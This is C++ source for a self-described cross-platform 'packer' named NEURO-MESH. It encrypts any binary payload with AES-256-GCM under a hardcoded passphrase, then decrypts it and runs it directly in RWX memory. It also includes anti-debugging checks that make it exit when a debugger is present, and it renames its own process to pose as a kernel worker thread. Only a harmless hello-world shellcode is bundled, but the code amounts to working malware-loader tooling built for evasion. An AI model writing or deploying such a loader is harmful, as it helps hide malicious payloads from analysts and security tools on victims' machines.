// ============================================================
// NEURO-MESH PACKER : ULTIMATE FINAL EDITION (GCM + CROSS-PLATFORM)
// ============================================================
// Auteur : El Yazid
// Description : Packer cross‑platform (Linux/Windows) avec chiffrement
//              AES-256-GCM, exécution en mémoire, anti‑debug.
// ============================================================

#include <iostream>
#include <vector>
#include <fstream>
#include <string>
#include <cstring>
#include <cstdint>
#include <ctime>
#include <cstdlib>

#ifdef _WIN32
    #include <windows.h>
    #define PACKER_API WINAPI
#else
    #include <unistd.h>
    #include <sys/mman.h>
    #include <sys/ptrace.h>
    #define PACKER_API
#endif

#include <openssl/evp.h>
#include <openssl/err.h>
#include <openssl/rand.h>

// ============================================================
// CONSTANTES
// ============================================================
#define AES_KEY_LEN         32
#define AES_GCM_IV_LEN      12
#define AES_GCM_TAG_LEN     16
#define PAYLOAD_FILE        "agent_encrypted.bin"
#define PACKER_PASSPHRASE   "NEURO_MESH_PACKER_SECURE_2025"

// ============================================================
// ANTI-DEBUG (Linux + Windows basique)
// ============================================================
#ifdef __linux__
static bool is_debugged() {
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) return true;
    // Vérification supplémentaire via /proc/self/status
    std::ifstream status("/proc/self/status");
    std::string line;
    while (std::getline(status, line)) {
        if (line.find("TracerPid:") != std::string::npos) {
            int pid;
            sscanf(line.c_str(), "TracerPid:\t%d", &pid);
            if (pid != 0) return true;
        }
    }
    return false;
}
#elif defined(_WIN32)
static bool is_debugged() {
    return IsDebuggerPresent();
}
#else
static bool is_debugged() { return false; }
#endif

// ============================================================
// DÉRIVATION DE CLÉ AES À PARTIR D'UNE PASSPHRASE (PBKDF2 simplifié)
// ============================================================
void derive_key(const std::string& passphrase, unsigned char* key) {
    // Utilisation d'une itération unique pour simplifier (en production, utiliser PBKDF2)
    // Ici on utilise un simple hash SHA256 de la passphrase + sel fixe
    EVP_MD_CTX* ctx = EVP_MD_CTX_new();
    const EVP_MD* md = EVP_sha256();
    EVP_DigestInit_ex(ctx, md, nullptr);
    EVP_DigestUpdate(ctx, passphrase.c_str(), passphrase.size());
    const char* salt = "NEURO_MESH_SALT";
    EVP_DigestUpdate(ctx, salt, strlen(salt));
    unsigned char digest[32];
    unsigned int digest_len;
    EVP_DigestFinal_ex(ctx, digest, &digest_len);
    EVP_MD_CTX_free(ctx);
    memcpy(key, digest, AES_KEY_LEN);
}

// ============================================================
// AES-256-GCM CRYPTO
// ============================================================
std::string encrypt_aes256_gcm(const std::string& plaintext,
                               const unsigned char* key,
                               unsigned char* iv_out) {
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";
    RAND_bytes(iv_out, AES_GCM_IV_LEN);
    std::vector<unsigned char> ciphertext(plaintext.size() + AES_GCM_TAG_LEN);
    int len = 0, ciphertext_len = 0;
    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, key, iv_out) != 1 ||
        EVP_EncryptUpdate(ctx, ciphertext.data(), &len,
                          (const unsigned char*)plaintext.c_str(), plaintext.size()) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    ciphertext_len = len;
    if (EVP_EncryptFinal_ex(ctx, ciphertext.data() + len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    ciphertext_len += len;
    unsigned char tag[AES_GCM_TAG_LEN];
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, AES_GCM_TAG_LEN, tag) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    EVP_CIPHER_CTX_free(ctx);
    std::string result((char*)iv_out, AES_GCM_IV_LEN);
    result.append((char*)ciphertext.data(), ciphertext_len);
    result.append((char*)tag, AES_GCM_TAG_LEN);
    return result;
}

std::string decrypt_aes256_gcm(const unsigned char* full_msg, size_t full_len,
                               const unsigned char* key) {
    if (full_len < AES_GCM_IV_LEN + AES_GCM_TAG_LEN) return "";
    unsigned char iv[AES_GCM_IV_LEN];
    memcpy(iv, full_msg, AES_GCM_IV_LEN);
    const unsigned char* ciphertext = full_msg + AES_GCM_IV_LEN;
    size_t ciphertext_len = full_len - AES_GCM_IV_LEN - AES_GCM_TAG_LEN;
    const unsigned char* tag = full_msg + AES_GCM_IV_LEN + ciphertext_len;
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return "";
    std::vector<unsigned char> plaintext(ciphertext_len);
    int len = 0, plaintext_len = 0;
    if (EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, key, iv) != 1 ||
        EVP_DecryptUpdate(ctx, plaintext.data(), &len, ciphertext, ciphertext_len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    plaintext_len = len;
    if (EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, AES_GCM_TAG_LEN, (void*)tag) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    if (EVP_DecryptFinal_ex(ctx, plaintext.data() + len, &len) != 1) {
        EVP_CIPHER_CTX_free(ctx);
        return "";
    }
    plaintext_len += len;
    EVP_CIPHER_CTX_free(ctx);
    return std::string((char*)plaintext.data(), plaintext_len);
}

// ============================================================
// CHARGEMENT / SAUVEGARDE
// ============================================================
std::vector<unsigned char> load_file(const std::string& filename) {
    std::vector<unsigned char> data;
    std::ifstream file(filename, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return data;
    size_t size = file.tellg();
    file.seekg(0, std::ios::beg);
    data.resize(size);
    file.read(reinterpret_cast<char*>(data.data()), size);
    file.close();
    return data;
}

void save_file(const std::vector<unsigned char>& data, const std::string& filename) {
    std::ofstream file(filename, std::ios::binary);
    if (!file.is_open()) return;
    file.write(reinterpret_cast<const char*>(data.data()), data.size());
    file.close();
}

// ============================================================
// EXÉCUTION DU PAYLOAD (cross‑platform)
// ============================================================
typedef void (*EntryPoint)();

void execute_payload(std::vector<unsigned char>& payload) {
    if (payload.empty()) {
        std::cerr << "[PACKER] Payload vide" << std::endl;
        return;
    }

#ifdef _WIN32
    DWORD old_protect;
    if (!VirtualProtect(payload.data(), payload.size(), PAGE_EXECUTE_READWRITE, &old_protect)) {
        std::cerr << "[PACKER] VirtualProtect échoué" << std::endl;
        return;
    }
    std::cout << "[PACKER] Mémoire RWX (Windows)" << std::endl;
#else
    size_t page_size = sysconf(_SC_PAGESIZE);
    uintptr_t addr = reinterpret_cast<uintptr_t>(payload.data());
    uintptr_t page_start = addr & ~(page_size - 1);
    size_t offset = addr - page_start;
    size_t total_size = ((payload.size() + offset + page_size - 1) / page_size) * page_size;
    if (mprotect(reinterpret_cast<void*>(page_start), total_size, PROT_READ | PROT_WRITE | PROT_EXEC) == -1) {
        perror("[PACKER] mprotect");
        return;
    }
    std::cout << "[PACKER] Mémoire RWX (Linux)" << std::endl;
#endif

    std::cout << "[PACKER] Saut vers le payload..." << std::endl;
    EntryPoint entry = reinterpret_cast<EntryPoint>(payload.data());
    entry();
}

// ============================================================
// GÉNÉRATION D'UN PAYLOAD FACTICE (x86_64 hello world)
// ============================================================
std::vector<unsigned char> generate_dummy_payload() {
    unsigned char raw_payload[] = {
        0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,  // mov rax, 1 (write)
        0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,  // mov rdi, 1 (stdout)
        0x48, 0x8d, 0x35, 0x0e, 0x00, 0x00, 0x00,  // lea rsi, [rip+14] (msg)
        0x48, 0xc7, 0xc2, 0x0d, 0x00, 0x00, 0x00,  // mov rdx, 13
        0x0f, 0x05,                                // syscall
        0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00,  // mov rax, 60 (exit)
        0x48, 0x31, 0xff,                          // xor rdi, rdi
        0x0f, 0x05,                                // syscall
        0x48, 0x65, 0x6c, 0x6c, 0x6f, 0x20, 0x50,  // "Hello P"
        0x61, 0x63, 0x6b, 0x65, 0x72, 0x21, 0x0a   // "acker!\n"
    };
    return std::vector<unsigned char>(raw_payload, raw_payload + sizeof(raw_payload));
}

// ============================================================
// MASQUAGE DU PROCESSUS (UNIX seulement)
// ============================================================
void hide_process_name(int argc, char* argv[]) {
#ifdef __linux__
    if (argc > 0) {
        char* p = argv[0];
        size_t len = strlen(p);
        const char* fake_name = "[kworker/u4:2]";
        size_t fake_len = strlen(fake_name);
        if (fake_len <= len) {
            strcpy(p, fake_name);
            for (size_t i = fake_len; i < len; ++i) p[i] = ' ';
        }
    }
#else
    (void)argc; (void)argv;
#endif
}

// ============================================================
// MAIN
// ============================================================
int main(int argc, char* argv[]) {
    hide_process_name(argc, argv);  // Masquer le processus (optionnel)

    if (is_debugged()) {
        std::cerr << "[PACKER] Anti-debug : débogueur détecté, arrêt." << std::endl;
        return 1;
    }

    std::cout << "[PACKER] NEURO-MESH Ultimate Packer (GCM)" << std::endl;
    std::cout << "========================================" << std::endl;

    // Dériver la clé AES à partir de la passphrase
    unsigned char aes_key[AES_KEY_LEN];
    derive_key(PACKER_PASSPHRASE, aes_key);

    // Traitement des arguments
    if (argc >= 2) {
        std::string arg = argv[1];
        if (arg == "--run" || arg == "-r") {
            // Mode exécution : charger le payload chiffré, déchiffrer, exécuter
            std::vector<unsigned char> encrypted = load_file(PAYLOAD_FILE);
            if (encrypted.empty()) {
                std::cerr << "[PACKER] Fichier " << PAYLOAD_FILE << " non trouvé." << std::endl;
                return 1;
            }
            std::string decrypted = decrypt_aes256_gcm(encrypted.data(), encrypted.size(), aes_key);
            if (decrypted.empty()) {
                std::cerr << "[PACKER] Échec du déchiffrement (mauvais tag ou clé)." << std::endl;
                return 1;
            }
            std::vector<unsigned char> payload(decrypted.begin(), decrypted.end());
            execute_payload(payload);
            return 0;
        }
        else if (arg == "--encrypt" || arg == "-e") {
            if (argc < 3) {
                std::cerr << "Usage: packer --encrypt <fichier_binaire>" << std::endl;
                return 1;
            }
            std::vector<unsigned char> raw = load_file(argv[2]);
            if (raw.empty()) {
                std::cerr << "Impossible de lire " << argv[2] << std::endl;
                return 1;
            }
            std::string plaintext(raw.begin(), raw.end());
            unsigned char iv[AES_GCM_IV_LEN];
            std::string encrypted = encrypt_aes256_gcm(plaintext, aes_key, iv);
            if (encrypted.empty()) {
                std::cerr << "Erreur de chiffrement" << std::endl;
                return 1;
            }
            std::vector<unsigned char> enc_vec(encrypted.begin(), encrypted.end());
            save_file(enc_vec, PAYLOAD_FILE);
            std::cout << "[PACKER] Payload chiffré sauvegardé dans " << PAYLOAD_FILE << std::endl;
            return 0;
        }
    }

    // Mode test : générer un payload factice, le chiffrer puis l'exécuter directement
    std::cout << "[PACKER] Mode test (génération d'un payload factice)" << std::endl;
    std::vector<unsigned char> dummy = generate_dummy_payload();
    std::string plaintext(dummy.begin(), dummy.end());
    unsigned char iv[AES_GCM_IV_LEN];
    std::string encrypted = encrypt_aes256_gcm(plaintext, aes_key, iv);
    if (encrypted.empty()) {
        std::cerr << "Erreur de chiffrement du dummy" << std::endl;
        return 1;
    }
    std::string decrypted = decrypt_aes256_gcm((unsigned char*)encrypted.data(), encrypted.size(), aes_key);
    if (decrypted.empty()) {
        std::cerr << "Erreur de déchiffrement du dummy" << std::endl;
        return 1;
    }
    std::vector<unsigned char> payload(decrypted.begin(), decrypted.end());
    execute_payload(payload);
    return 0;
}
